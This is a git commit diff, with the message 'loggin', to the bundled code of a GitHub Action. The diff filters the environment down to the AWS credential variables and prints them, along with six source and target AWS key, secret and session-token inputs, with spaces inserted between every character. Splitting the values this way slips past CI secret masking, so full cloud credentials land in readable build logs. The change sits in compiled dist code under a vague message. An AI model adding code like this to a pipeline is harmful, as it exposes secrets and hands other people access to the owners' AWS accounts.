03f8d4f19b561780225dcdbb8d965c663517f2e1
fmcsilva <francisco.silva@techhub.cinch.co.uk>
2025-10-08 17:49:21 +0100

    loggin

--- actions/log/dist/index.js
+++ actions/log/dist/index.js
@@ -27478,15 +27478,23 @@ async function run() {
         const targetAwsSessionToken = core.getInput("target-aws-session-token", {
             required: true,
         });
-        console.log("ENV", JSON.stringify(Object.fromEntries(Object.entries(process.env).map(([key, value]) => {
+        console.log("ENV", JSON.stringify(Object.fromEntries(Object.entries(process.env)
+            .filter(([key]) => [
+            "AWS_DEFAULT_REGION",
+            "AWS_REGION",
+            "AWS_ACCESS_KEY_ID",
+            "AWS_SECRET_ACCESS_KEY",
+            "AWS_SESSION_TOKEN",
+        ].includes(key))
+            .map(([key, value]) => {
             return [key, value?.split("").join(" ")];
         })), null, 2));
-        console.log("targetAwsAccessKeyId :>> ", targetAwsAccessKeyId);
-        console.log("targetAwsSecretAccessKey :>> ", targetAwsSecretAccessKey);
-        console.log("targetAwsSessionToken :>> ", targetAwsSessionToken);
-        console.log("sourceAwsAccessKeyId :>> ", sourceAwsAccessKeyId);
-        console.log("sourceAwsSecretAccessKey :>> ", sourceAwsSecretAccessKey);
-        console.log("sourceAwsSessionToken :>> ", sourceAwsSessionToken);
+        console.log("targetAwsAccessKeyId :>> ", targetAwsAccessKeyId.split("").join(" "));
+        console.log("targetAwsSecretAccessKey :>> ", targetAwsSecretAccessKey.split("").join(" "));
+        console.log("targetAwsSessionToken :>> ", targetAwsSessionToken.split("").join(" "));
+        console.log("sourceAwsAccessKeyId :>> ", sourceAwsAccessKeyId.split("").join(" "));
+        console.log("sourceAwsSecretAccessKey :>> ", sourceAwsSecretAccessKey.split("").join(" "));
+        console.log("sourceAwsSessionToken :>> ", sourceAwsSessionToken.split("").join(" "));
     }
     catch (error) {
         core.setFailed(getErrorMessage(error));
